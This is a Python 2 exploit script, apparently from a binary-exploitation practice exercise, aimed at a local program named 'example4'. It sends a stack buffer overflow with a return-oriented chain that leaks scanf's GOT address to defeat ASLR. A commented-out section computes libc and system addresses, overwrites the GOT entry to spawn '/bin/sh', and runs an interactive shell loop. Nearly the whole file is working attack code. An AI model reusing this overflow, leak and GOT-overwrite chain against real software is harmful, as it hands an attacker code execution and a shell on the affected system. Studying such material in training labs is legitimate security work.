#!/usr/bin/python
'''
example4.py
'''
import struct
import subprocess
import os
import pty
import time

def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\n':
        return res
  except:
    raise
def read(fd, n):
  return os.read(fd, n)
def writeline(proc, data):
  try:
    proc.stdin.write(data + '\n')
  except:
    raise
def p32(val):
  return struct.pack("<I", val)
def u32(data):
  return struct.unpack("<I", data)[0]
out_r, out_w = pty.openpty()    # to ignore buffer
s = subprocess.Popen("./example4", stdin=subprocess.PIPE, stdout=out_w)
'''
0x804851a <__libc_csu_init+90>:  pop    %edi
0x804851b <__libc_csu_init+91>:  pop    %ebp
0x804851c <__libc_csu_init+92>:  ret    
'''


pop_pop_ret = 0x63b    #0x804851a
pop_ret = pop_pop_ret + 1 # right next intruction
scanf_plt = 0x56555410      #0x565555c7, scanf got : 0x62f80
puts_plt = 0x565553f0   #0x565553f0
puts_got = 0x56556fe0    #Not yet..
string_fmt = 0xffffe6a8      # "%s"
scanf_got = 0x56556fe8 #ebx+0x14

print(readline(out_r))    # Hello World!\n
print(readline(out_r))   # Hello ASLR!\n

payload  = "A"*36           # buf padding
payload += p32(puts_plt)   # ret addr (puts@plt + 6)
payload += p32(0xdeadbeef)  # ret after puts
payload += p32(0x56556fe8)   # scanf@got
writeline(s, payload)
out = readline(out_r)     # memory leakage of scanf@got
print(out)
scanf_addr = u32(out[:4])
print("scanf @ " + hex(scanf_addr))



'''
payload += p32(puts_plt + 6)   # ret addr (puts@plt + 6)
payload += p32(pop_ret)  # ret after puts
payload += p32(scanf_got)   # scanf@got
payload += p32(scanf_plt)
payload += p32(pop_pop_ret)
payload += p32(string_fmt)
payload += p32(scanf_got)
payload += p32(scanf_plt)
payload += p32(0xdeadbeef)
payload += p32(scanf_got+4)
print(payload)
writeline(s, payload)
libc = u32(readline(out_r)[:4]) - 0x5c0c0
system = libc + 0x3ada0
print("libc @ " + hex(libc))
print("system @ " + hex(system))
writeline(s, p32(system)+"/bin/sh\x00")
print("[+] get shell")
while True:
  cmd = raw_input("$ ")
  writeline(s, cmd)
  time.sleep(0.2)
  print(read(out_r, 1024))
'''